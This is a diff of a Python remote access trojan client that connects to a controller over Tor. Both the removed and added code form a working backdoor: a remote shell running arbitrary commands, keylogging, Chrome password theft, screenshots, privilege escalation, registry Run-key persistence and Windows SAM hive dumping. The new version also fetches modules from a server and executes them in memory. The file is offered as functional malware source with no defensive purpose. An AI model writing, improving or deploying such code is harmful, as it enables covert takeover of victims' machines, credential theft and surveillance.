@@ -1,278 +1,161 @@
-# import cv2
 import json
 import os
 import socket
-import subprocess
 import sys
-import threading
-from sys import platform
-from shutil import copyfile
+import importlib.util
+from base64 import b64decode
 import requests
-from mss import mss
 
-#importing tor network
+# Minimal tor network import for initial connection
 from tor_network import ClientSocket, Tor
 
-# Local tools to the application
-from tools import keylogger,privilege,chrome
-
-#constraints
 ENCODING = 'utf-8'
 
-
-def reliable_send(data):
-    jsondata = json.dumps(data)
-    s.send(jsondata.encode(ENCODING))
-
-def reliable_recv():
-    data = ''
-    while True:
+class MemoryModule:
+    """Handles in-memory module loading"""
+    @staticmethod
+    def load_module_from_code(code, module_name):
         try:
-            data = data + s.recv(1024).decode(ENCODING).rstrip()
-            return json.loads(data)
-        except ValueError:
-            continue
-        except socket.error:
-            raise()
+            # Create module spec
+            spec = importlib.util.spec_from_loader(
+                module_name, 
+                loader=None, 
+                origin="<memory>"
+            )
+            
+            # Create module
+            module = importlib.util.module_from_spec(spec)
+            
+            # Add to sys.modules
+            sys.modules[module_name] = module
+            
+            # Execute module code
+            exec(code, module.__dict__)
+            
+            return module
+        except Exception as e:
+            print(f"Failed to load module {module_name}: {e}")
+            return None
 
+class Agent:
+    def __init__(self):
+        self.modules = {}
+        self.server_url = "http://127.0.0.1:5555"
+        self.setup_connection()
 
-def download_file(file_name):
-    f = open(file_name, 'wb')
-    s.settimeout(2)
-    chunk = s.recv(1024)
-    while chunk:
-        f.write(chunk)
+    def setup_connection(self):
+        """Setup initial connection and get available tools"""
+        global s
+        tor = Tor()
+        onion, port = tor.read_address_from_binary()
+        client = ClientSocket(onion, port)
+        s = client.create_connection()
+
+    def load_module(self, module_name):
+        """Load module from server into memory"""
         try:
-            chunk = s.recv(1024)
-        except socket.timeout as e:
-            break
-    s.settimeout(None)
-    f.close()
+            if module_name in self.modules:
+                return self.modules[module_name]
 
+            # Get module code from server
+            response = requests.get(f"{self.server_url}/tools/{module_name}.py")
+            if response.status_code != 200:
+                raise Exception(f"Failed to get module {module_name}")
 
-def upload_file(file_name):
-    f = open(file_name, 'rb')
-    s.send(f.read())
-    f.close()
+            # Load module into memory
+            module = MemoryModule.load_module_from_code(
+                response.text,
+                module_name
+            )
 
+            if module:
+                self.modules[module_name] = module
+                return module
+            
+            raise Exception(f"Failed to load module {module_name}")
+        except Exception as e:
+            print(f"Error loading module {module_name}: {e}")
+            return None
 
-def download_url(url):
-    get_response = requests.get(url)
-    file_name = url.split('/')[-1]
-    with open(file_name, 'wb') as out_file:
-        out_file.write(get_response.content)
+    def reliable_send(self, data):
+        jsondata = json.dumps(data)
+        s.send(jsondata.encode(ENCODING))
 
+    def reliable_recv(self):
+        data = ''
+        while True:
+            try:
+                data = data + s.recv(1024).decode(ENCODING).rstrip()
+                return json.loads(data)
+            except ValueError:
+                continue
+            except socket.error:
+                raise
 
-def screenshot():
-    if platform == "win32" or platform == "darwin":
-        with mss() as screen:
-            filename = screen.shot()
-            os.rename(filename, '.screen.png')
-    elif platform == "linux" or platform == "linux2":
-        with mss(display=":0.0") as screen:
-            filename = screen.shot()
-            os.rename(filename, '.screen.png')
-
-# TODO: screenshot other monitors
-
-
-# TODO: SAM - this code is untested
-def get_sam_dump():
-    if not is_admin():
-        return ("You must run this function as an Administrator.",0,0)
-
-    SAM = r'C:\Windows\System32\config\SAM'
-    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
-    SECURITY = r'C:\Windows\System32\config\SECURITY'
-    try:
-        sam_file = open(SAM, 'rb')
-        system_file = open(SYSTEM, 'rb')
-        security_file = open(SECURITY, 'rb')
-        
-        sam_data = sam_file.read()
-        system_data = system_file.read()
-        security_data = security_file.read()
-        sam_file.close()
-        system_file.close()
-        security_file.close()
-        
-        return (sam_data, system_data, security_data)
-    except PermissionError:
-        return ("Insufficient permissions to access SAM, SYSTEM, or SECURITY files.",0,0)
-    except FileNotFoundError:
-        return ("SAM, SYSTEM, or SECURITY file not found. Please check the file paths.",0,0)
-    except Exception as e:
-        return (f"An unexpected error occurred: {str(e)}",0,0)
-
-
-#USING WEBCAM FEATURE ADDS 40MB TO THE EXECUTABLE AS CV2 IS A LARGE LIBRARY
-# def capture_webcam():
-#     webcam = cv2.VideoCapture(0)
-#     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
-
-#     # Check if the webcam is available
-#     if not webcam.isOpened():
-#         print("No webcam available")
-#         return
-    
-#     ret, frame = webcam.read()
-
-#     # Check if the webcam was able to capture a frame
-#     if not ret:
-#         print("Failed to read frame from webcam")
-#         return
-
-#     webcam.release()
-
-#     # Save the frame to a file
-#     if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
-#         is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
-#         if is_success:
-#             with open('.webcam.png', 'wb') as f:
-#                 f.write(im_buf_arr.tobytes())
-#         else:
-#             print("Failed to save webcam image")
-
-
-def persist(reg_name, copy_name):
-    file_location = os.environ['appdata'] + '\\' + copy_name
-    try:
-        if not os.path.exists(file_location):
-            copyfile(sys.executable, file_location)
-            subprocess.call(
-                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
-                shell=True)
-            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
-        else:
-            reliable_send('[+] Persistence Already Exists')
-    except:
-        reliable_send('[-] Error Creating Persistence With The Target Machine')
-
-
-def is_admin():
-    if platform == 'win32':
+    def execute_module_function(self, module_name, function_name, *args, **kwargs):
+        """Execute a function from a loaded module"""
         try:
-            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
-        except:
-            return False
-        else:
-            return True
-    elif platform == "linux" or platform == "linux2" or platform == "darwin":
-        pass
-        # TODO implmenet checking if these platforms have root/admin access
-    return False
+            module = self.load_module(module_name)
+            if module and hasattr(module, function_name):
+                return getattr(module, function_name)(*args, **kwargs)
+            return None
+        except Exception as e:
+            print(f"Error executing {function_name} from {module_name}: {e}")
+            return None
 
-def chrome_passwords():
-    try:
-        passwords = chrome.chrome_pass()
-        fn = open(passwords,"r")
-        reliable_send(fn.read())
-        fn.close()
-    except Exception as e:
-        reliable_send('[-] Error getting passwords from chrome',e)
-
-
-def shell():
-    while True:
-        command = reliable_recv()
-        print(command)
-        if command == 'quit':
-            break
-        elif command[:3] == 'cd ':
-            os.chdir(command[3:])
-        elif command[:6] == 'upload':
-            download_file(command[7:])
-        elif command[:8] == 'download':
-            upload_file(command[9:])
-        elif command[:3] == 'get':
-            try:
-                download_url(command[4:])
-                reliable_send('[+] Downloaded File From Specified URL!')
-            except:
-                reliable_send('[!!] Download Failed!')
-        elif command[:10] == 'screenshot':
-            screenshot()
-            upload_file('.screen.png')
-            os.remove('.screen.png')
-        # elif command[:6] == 'webcam':
-        #     capture_webcam()
-        #     upload_file('.webcam.png')
-        #     os.remove('.webcam.png')
-        elif command[:12] == 'keylog_start':
-            keylog = keylogger.Keylogger()
-            t = threading.Thread(target=keylog.start)
-            t.start()
-            reliable_send('[+] Keylogger Started!')
-        elif command[:11] == 'keylog_dump':
-            logs = keylog.read_logs()
-            reliable_send(logs)
-        elif command[:11] == 'keylog_stop':
-            keylog.self_destruct()
-            t.join()
-            reliable_send('[+] Keylogger Stopped!')
-        elif command[:11] == 'persistence':
-            try:
-                reg_name, copy_name = command[12:].split(' ')
-                persist(reg_name, copy_name)
-            except Exception as e:
-                reliable_send('[-] Persistence Error! ' + str(e))
-        elif command[:7] == 'sendall':
-            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                             stdin=subprocess.PIPE)
-        elif command[:5] == 'check':
-            try:
-                if is_admin():
-                    reliable_send("[!!]Admin privileges" + ' platform: ' + platform)
+    def shell(self):
+        while True:
+            command = self.reliable_recv()
+            
+            if command == 'quit':
+                break
+                
+            elif command[:12] == 'keylog_start':
+                result = self.execute_module_function('keylogger', 'start_keylogger')
+                self.reliable_send('[+] Keylogger Started!' if result else '[-] Keylogger failed to start')
+                
+            elif command[:11] == 'keylog_dump':
+                logs = self.execute_module_function('keylogger', 'dump_logs')
+                self.reliable_send(logs if logs else '[-] No logs available')
+                
+            elif command[:11] == 'keylog_stop':
+                result = self.execute_module_function('keylogger', 'stop_keylogger')
+                self.reliable_send('[+] Keylogger Stopped!' if result else '[-] Failed to stop keylogger')
+                
+            elif command[:11] == 'chrome_pass':
+                passwords = self.execute_module_function('chrome', 'get_passwords')
+                self.reliable_send(passwords if passwords else '[-] Failed to get passwords')
+                
+            elif command[:9] == 'privilege':
+                result = self.execute_module_function('privilege', 'escalate')
+                self.reliable_send(result if result else '[-] Privilege escalation failed')
+                
+            elif command[:10] == 'screenshot':
+                screenshot = self.execute_module_function('screenshot', 'capture')
+                if screenshot:
+                    self.reliable_send(screenshot)
                 else:
-                    reliable_send("[!]User privileges" + ' platform: ' + platform)
-            except:
-                reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
-        elif command[:5] == 'start':
-            try:
-                subprocess.Popen(command[6:], shell=True)
-                reliable_send('[+] Started!')
-            except:
-                reliable_send('[-] Failed to start!')
-        
-        
-        #still error in chrome_pass
-        elif command[:11] == 'chrome_pass':
-            chrome_passwords()
+                    self.reliable_send('[-] Screenshot failed')
+                    
+            else:
+                # Default command execution
+                try:
+                    import subprocess
+                    execute = subprocess.Popen(
+                        command, 
+                        shell=True, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE
+                    )
+                    result = execute.stdout.read() + execute.stderr.read()
+                    self.reliable_send(result.decode())
+                except Exception as e:
+                    self.reliable_send(f"[-] Error executing command: {e}")
 
-        elif command[:8] == 'sam_dump':
-            sam_dump, system_dump, security_dump = get_sam_dump()
-            reliable_send((sam_dump, system_dump, security_dump))
-        
-        elif command[:9] == 'privilege':
-            try:
-                result = privilege.priv()
-                reliable_send(result)
-            except Exception as e:
-                reliable_send('[-] Failed to escalate privilege!',e)
+def main():
+    agent = Agent()
+    agent.shell()
 
-        else:
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                       stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()
-            result = result.decode()
-            reliable_send(result)
-
-def connect():
-    while True:
-        timeout = 30
-        try:
-            global s
-            s = clientsock.create_connection()
-            shell()
-            s.close()
-            break
-        except socket.error as err:
-            print(err)
-            connect()
-
-tor = Tor()
-onion, port = tor.read_address_from_binary()
-print('onion: ' + onion + '\nport: ' + str(port))
-
-clientsock = ClientSocket(onion,port)
-connect()
+if __name__ == '__main__':
+    main()
